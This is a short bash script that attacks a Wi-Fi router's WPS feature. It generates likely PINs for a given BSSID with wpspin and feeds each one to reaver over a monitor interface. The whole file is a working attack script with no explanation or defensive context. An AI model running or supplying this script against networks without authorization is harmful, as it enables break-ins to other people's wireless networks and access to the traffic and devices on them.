#!/bin/bash

PINS=$(wpspin -A $1 | grep -Eo '\b[0-9]{8}\b' | tr '\n' ' ')

for PIN in $PINS
do
    echo Attempting PIN: $PIN
    sudo reaver --max-attempts=1 -l 100 -r 3:45 -i mon0 -b $1 -c 1 -p $PIN
done
echo "PIN Guesses Complete"
